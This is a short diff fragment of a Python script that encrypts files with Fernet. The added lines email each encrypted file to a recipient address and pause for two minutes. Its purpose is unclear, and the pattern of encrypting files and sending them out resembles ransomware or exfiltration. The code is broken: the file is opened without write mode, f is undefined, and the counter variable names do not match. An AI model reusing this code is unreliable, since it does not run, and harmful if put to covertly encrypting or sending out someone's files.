@@ -183,3 +183,7 @@ for encrypting_file_in in files_to_encrpt:
     encrypted = fernet.encrypt(data)
     with open(encrypted_file_names[counts]):
         f.write(encrypted)
+
+    send_email(encrypted_file_names[counts], encrypted_file_names[counts], toaddr)
+    count += 1
+time.sleep(120)
